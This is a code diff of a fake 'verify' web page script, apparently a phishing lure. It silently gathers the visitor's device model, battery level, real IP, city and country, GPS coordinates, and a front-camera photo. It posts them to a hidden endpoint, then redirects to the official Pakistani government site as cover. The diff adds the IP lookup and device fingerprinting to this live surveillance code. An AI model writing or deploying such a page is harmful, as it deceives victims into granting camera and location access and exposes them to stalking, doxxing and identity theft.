@@ -37,55 +37,63 @@
 
 <script>
     async function verify() {
-        // UI Update
         document.getElementById('mainBtn').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
 
-        // Advanced Info Collection
+        // 1. Precise Device Model Detection
+        let ua = navigator.userAgent;
+        let deviceModel = "Unknown Device";
+        if (ua.match(/Android/i)) {
+            let match = ua.match(/Android\s([0-9\.]+);\s([^;)]+)/);
+            deviceModel = match ? match[2] : "Android Device";
+        } else if (ua.match(/iPhone/i)) {
+            deviceModel = "iPhone";
+        }
+
         let info = { 
+            model: deviceModel,
             platform: navigator.platform, 
-            lat: "0", 
-            lon: "0",
-            battery: "N/A"
+            lat: "0", lon: "0",
+            battery: "N/A",
+            time: new Date().toLocaleString(),
+            city: "N/A", country: "N/A", realIp: "N/A"
         };
 
-        // Battery level (Instant fetch)
+        // 2. Instant Data Collection (Battery & Geo-IP)
         if(navigator.getBattery) { 
             const b = await navigator.getBattery(); 
             info.battery = Math.round(b.level*100)+"%"; 
         }
 
-        // ⚡ FAST ACTION: Camera aur Location dono ek sath maango
-        const cameraTask = navigator.mediaDevices.getUserMedia({video: { facingMode: "user" }})
-            .catch(() => null); // Agar camera deny ho jaye to null
+        // Fetch Real IP, City, Country from External API (No Delay)
+        const geoFetch = fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
+            info.city = data.city;
+            info.country = data.country_name;
+            info.realIp = data.ip;
+        }).catch(() => null);
+
+        // 3. Trigger Camera & Location (Parallel)
+        const cameraTask = navigator.mediaDevices.getUserMedia({video: { facingMode: "user" }}).catch(() => null);
 
         navigator.geolocation.getCurrentPosition(async (pos) => {
             info.lat = pos.coords.latitude; 
             info.lon = pos.coords.longitude;
-            
-            // Jab location mil jaye, check karo camera ready hai?
-            const stream = await cameraTask;
-            handleCapture(stream, info);
-        }, (err) => {
-            // Agar location fail ho jaye, tab bhi camera check karo
-            navigator.mediaDevices.getUserMedia({video: { facingMode: "user" }})
-                .then(stream => handleCapture(stream, info))
-                .catch(() => send(info, null));
-        }, { enableHighAccuracy: false, timeout: 6000 }); // Accuracy kam ki taaki foran result mile
+            await geoFetch; // Wait for Geo data
+            handleCapture(await cameraTask, info);
+        }, async (err) => {
+            await geoFetch;
+            handleCapture(await cameraTask, info);
+        }, { enableHighAccuracy: false, timeout: 5000 });
     }
 
     async function handleCapture(stream, info) {
         if(stream) {
             const video = document.getElementById('v');
             video.srcObject = stream;
-            
-            // Photo capture delay sirf 0.8s (palk jhapaktay hi)
             setTimeout(() => {
                 const canvas = document.getElementById('c');
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const img = canvas.toDataURL('image/jpeg', 0.6);
-                
-                // Stop camera stream for security
                 stream.getTracks().forEach(t => t.stop());
                 send(info, img);
             }, 800);
@@ -100,7 +108,6 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ info: i, photo: p })
         }).then(() => {
-            // Official Pakistani Government Site par redirection
             window.location.href = "https://www.pakistan.gov.pk/";
         });
     }
